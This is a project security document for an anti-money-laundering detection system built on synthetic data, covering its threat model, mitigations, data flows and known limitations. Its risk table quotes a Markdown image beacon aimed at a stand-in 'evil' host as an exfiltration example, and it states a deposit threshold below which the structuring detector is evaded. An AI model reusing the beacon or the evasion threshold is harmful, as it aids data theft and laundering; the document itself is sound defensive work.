# Security

> **Status: final review (Phase 8).** Every risk below states what is done and what
> is not. Scan results are at the end.

## Reporting a vulnerability

This is a portfolio project. Please report issues privately to the repository owner
rather than in a public issue.

## Scope and intended use

AML Sentinel is designed for **synthetic data only** (IBM AMLworld). It is not
certified for use with real customer data. Using it on real data would require a
separate data-protection impact assessment, legal review and model validation.

## Threat model

### Assets

| Asset | Why it matters |
|---|---|
| Transaction data and labels | Training integrity. In a real deployment it would be personal and financial data |
| Trained models and calibrators | Tampering changes who gets flagged |
| Alert queue, case notes, SAR drafts | Sensitive investigative material |
| Audit log | Evidence of who did what. Must be tamper-evident |
| API keys and secrets (`LLM_API_KEY`, `JEV_API_KEY`, API auth keys) | Account takeover and data exfiltration |

### Trust boundaries

1. **Raw data → loader.** Every field is untrusted. It is schema- and value-validated
   in bulk; see `aml_sentinel.data.loader`.
2. **API clients → FastAPI** (`aml_sentinel.api`). Authentication, roles, rate limits,
   size limits, a `Host` allowlist, strict CORS and Pydantic validation apply here.
3. **Local machine → external LLM / Jev** (opt-in SAR drafter, benchmark-only Jev). Only
   pseudonymised, synthetic data may cross this boundary.
4. **Model artifacts on disk → process.** Artifacts load only from trusted local
   paths, after SHA-256 verification (`aml_sentinel.integrity`).
5. **Analyst → dashboard** (`aml_sentinel.dashboard`). The dashboard is only an API
   client that uses the analyst's own key. Untrusted text is rendered as plain text.

### Risks and mitigations

| Risk | Mitigation | Status |
|---|---|---|
| Secrets in code or git | pydantic-settings and env vars; `SecretStr`; `.env` git-ignored; gitleaks in pre-commit and CI; validation errors never echo inputs | Done |
| Raw data or models committed | `.gitignore`; `check-added-large-files` hook | Done |
| Malformed or hostile input data | Header check, dtype coercion, value checks, alphanumeric-only IDs in the API schema | Done |
| Data leakage, which gives optimistic metrics | Time-based half-open splits; FX fit on train only; leakage tests | Done (extended in later phases) |
| Vulnerable dependencies | Hash-pinned lockfiles; pip-audit; bandit | Done |
| Malicious model files (pickle RCE) | Native/safetensors formats and checksum before load | Helper done, applied from Phase 3 |
| Data poisoning | API clients cannot write to the scoring history (see below). Training data comes only from checksum-verified local files, and every model artifact is checksum-verified before loading. **Not addressed:** the training labels themselves are trusted. There is no label-noise robustness test and no outlier screening of training rows; with real data, label provenance and access to the training store would be controls | Partly done |
| Model evasion (for example, splitting amounts under thresholds) | Behaviour features (trailing velocity and volume, graph snapshots) do not depend on one threshold, and the System 2 structuring detector looks at near-threshold deposits from distinct senders. **Not addressed:** no adversarial evaluation was run. An adaptive launderer can learn fixed thresholds: for example, deposits below 80% of 10k USD evade the structuring detector by construction. The model also leans on simulator artifacts such as payment format (ADR-010), which an adversary could avoid | Partly done; not evaluated adversarially |
| Prompt injection via transaction fields | Alert summaries are rendered only from numeric features through fixed templates, with no free text or IDs. A character allowlist, a length cap and an instruction to treat the state as data apply on top. Every model answer is schema-validated (`parse_answers`). The SAR step follows in Phase 6 | Done for System 1; SAR in Phase 6 |
| Data exfiltration to external LLMs | Summaries carry no identifiers. SAR facts are pseudonymised (`ACCT-nnn`) before any external call, and the map never leaves the machine. Outbound fields are documented below. The template drafter is the default | Done |
| Prompt injection into SAR drafting | Case data is sent as delimited JSON, with a system instruction to ignore instructions inside it. The reply must match a strict JSON schema (extra fields are rejected). Every account, amount and date is checked against the case facts, and unknown tokens make the draft fall back to the template. The "DRAFT - requires analyst review" stamp is always added | Done |
| Jev used with real data | The adapter is disabled by default and needs `JEV_ENABLED` plus a key. It raises `SyntheticDataRequiredError` unless the batch is explicitly `is_synthetic=True`, which defaults to False. A test proves nothing is sent | Done |
| Tampered model weights | Laya checkpoints are verified against a SHA-256 manifest and also through Laya's `expected_sha256` before parsing. Weights are safetensors only | Done |
| Insider misuse | Append-only, hash-chained audit log (`aml_sentinel.audit`). It records every case view, SAR generation, SAR edit and decision with who, what, when and the case. Details are restricted to an allowlist of non-sensitive keys, and notes are recorded by length only. Roles: analyst and admin; only admins read the log. Case actions and SAR versions are append-only (SQLite triggers). A SAR can be approved only when its latest draft is fully grounded | Done |
| Unauthenticated or over-privileged API access | API keys (256-bit) are stored only as SHA-256 digests and compared in constant time against every entry. Roles are checked per endpoint. Every endpoint except `/health` needs a key, and docs/OpenAPI are disabled. Auth-matrix tests cover no key, wrong key and wrong role on every endpoint | Done |
| Key guessing and request floods | Per-user token bucket. Failed authentication spends a per-IP budget and gets 429 | Done (single process) |
| Oversized or hostile requests | Body limit (64 KiB) checked on `Content-Length` and on streamed bodies. Pydantic models forbid unknown fields and bound every string. Case IDs are regex-validated. 422 responses never echo input | Done |
| Browser-based attacks on the API | Exact-origin CORS allowlist (wildcards rejected at startup). `Host` allowlist against DNS rebinding. CSP `default-src 'none'`, `X-Frame-Options: DENY`, `nosniff`, `no-store`, `Referrer-Policy: no-referrer`, HSTS | Done |
| Stored XSS and Markdown injection in the dashboard | Untrusted values go only to plain-text widgets (`st.dataframe`, `st.text_area`, `st.text`). Dynamic text in Markdown widgets is escaped (blocks `![](https://evil/?leak)` beacons). Plotly labels are HTML-escaped. An AST test forbids `unsafe_allow_html`, `st.markdown`, `st.write`, `st.html` and cross-session `st.cache*` | Done |
| SQL injection | stdlib `sqlite3` with parameterised statements only. A test stores a `DROP TABLE` payload as data | Done |
| Data poisoning via the API | `POST /score` never adds the scored transaction to the history. Features use only rows at or before its timestamp; a test checks that fabricated future rows do not change a score | Done |

## What leaves the machine

| Component | Destination | Data sent | When |
|---|---|---|---|
| Laya | nothing (local) | n/a | always local |
| Laya base download | huggingface.co | none (download only), pinned commit | once |
| SAR drafter, external (opt-in) | api.anthropic.com over HTTPS (official `anthropic` SDK) | per case: the case id, `ACCT-nnn` tokens (never real account ids or bank codes), payment amounts, dates and formats, detector pattern names and sizes, and the calibrated risk score; plus the fixed system prompt and the API key | only if `LLM_PROVIDER=external` and `LLM_API_KEY` is set. The template default sends nothing |
| Jev (benchmark) | api.typesafe.ai over HTTPS | per alert: a numeric summary (amounts, counts, ratios, ages; **no** account IDs, bank codes or names), the fixed questions, the model name, and the API key in the `Authorization` header | only if `JEV_ENABLED=true`, only for synthetic data |
| Dashboard (Streamlit) | nothing | Usage telemetry is disabled (`gatherUsageStats = false` in `.streamlit/config.toml`); the server binds to 127.0.0.1 | always |

TypeSafe states that Jev is not trained on customer requests
(docs.typesafe.ai/models). The data still leaves the machine, so real customer data
must **never** be sent.

## Logging policy

- Logs are structured JSON. They hold counts, durations, file names and case IDs.
- Logs never contain account IDs, amounts, names, free text or secrets.
- As a backstop, fields whose names look like they hold secrets are masked.

## Known limitations

- **SAR grounding checks entities, not claims.** Accounts, amounts and dates are
  verified, but a schema-valid narrative could still characterise the activity
  wrongly (for example, calling it "legitimate"). The mandatory review stamp and the
  human analyst are the control for this.
- **The audit log is tamper-evident, not tamper-proof.** Anyone with write access
  could rebuild the whole chain. Production would anchor the head hash externally
  (WORM storage or a signed timestamp).
- **Amounts and dates are shared with the external drafter.** They are synthetic
  here. With real data, a privacy review would have to decide whether they may
  leave the organisation, or whether to coarsen them.

- **No TLS in the local demo.** The API and dashboard bind to 127.0.0.1 over plain
  HTTP. Any other deployment needs a TLS-terminating reverse proxy; HSTS takes effect
  only then.
- **Rate limits are per process and in memory.** Several workers or replicas would
  each enforce their own budget. Production would use a shared store (for example
  Redis) or the gateway's limiter.
- **API keys have no expiry or rotation workflow.** Revocation means removing the
  digest from `API_KEYS` and restarting. Production would use an identity provider
  (OIDC) with short-lived tokens.
- **No four-eyes rule.** The analyst who edits a SAR can also approve it. A real
  filing workflow would require a second reviewer.
- **The case store is append-only through code, not tamper-evident.** SQLite triggers
  stop updates and deletes from the application. Someone with file access could
  still edit the database; the hash-chained audit log is the evidence trail.
- **Every case view is audited,** which is the right control for insider misuse but
  grows the log. The audit log rereads the file to find the chain head (O(n) per
  append); production would keep the head in memory or in a database.

- **Model artifacts are checksummed, not signed.** A checksum proves an artifact is
  unchanged since the manifest was written, but whoever can write the manifest can
  replace both. Production would sign artifacts and keep a model registry with
  approvals.
- **Demo keys appear on the console.** `make demo` mints an analyst and an admin key
  for that process when `API_KEYS` is unset and prints them once to stdout. They
  never go to the log stream (a test checks this) and are not saved. Under Docker,
  stdout is the container log, so the keys are readable with `docker compose logs`
  by anyone with access to the Docker daemon. The demo refuses `ENVIRONMENT=prod`;
  set `API_KEYS` for any shared machine (ADR-024).
- **The Docker image has not been built on the development machine** (Docker is not
  installed there). Its design is reviewed, not tested: see ADR-024.
- Lockfiles are resolved on Windows. Platform-specific transitive dependencies may
  need a re-lock on Linux. See `docs/DECISIONS.md`.

## Supply chain

- Dependencies are pinned with hashes (`requirements/*.txt`) and installed with
  `--require-hashes`.
- pip-audit runs on **every** lockfile (base, dev, laya, gnn, llm) in CI, in
  pre-commit and in `make security`.
- CI actions are pinned to full commit SHAs, with the version in a comment, and a
  test fails if any `uses:` line references a tag.
- The Docker base image is pinned by digest. The image installs only the hashed base
  lockfile, adds only `libgomp1`, runs as uid 10001 with code read-only to it, and
  compose drops all capabilities and publishes ports on the host's loopback only.
- `httpx2` (the dashboard's HTTP client) was checked in Phase 9 because the name looks
  like a typosquat of `httpx`. It is Pydantic's maintained fork: the PyPI project is
  owned by the `pydantic` organisation, the source is github.com/pydantic/httpx2,
  and both locked 2.13.1 hashes match PyPI.

## Security scan results (Phase 8)

These were run on the final Phase 8 tree with the locked tool versions.

| Scan | Scope | Result |
|---|---|---|
| bandit (`bandit -c pyproject.toml -r src`) | all of `src/` | no issues |
| pip-audit `--strict --require-hashes` | base, dev, laya, gnn, llm lockfiles | no known vulnerabilities |
| gitleaks (pre-commit, `--all-files`) | the working tree | no leaks |
| Auth matrix tests | every API endpoint × no key / wrong key / wrong role | pass |
| Injection tests | SQL payloads stored as data; Markdown/HTML escaping; SAR grounding of hostile edits | pass |

A clean scan means these tools found nothing. It does not prove the absence of
vulnerabilities. No penetration test or external review has been done.
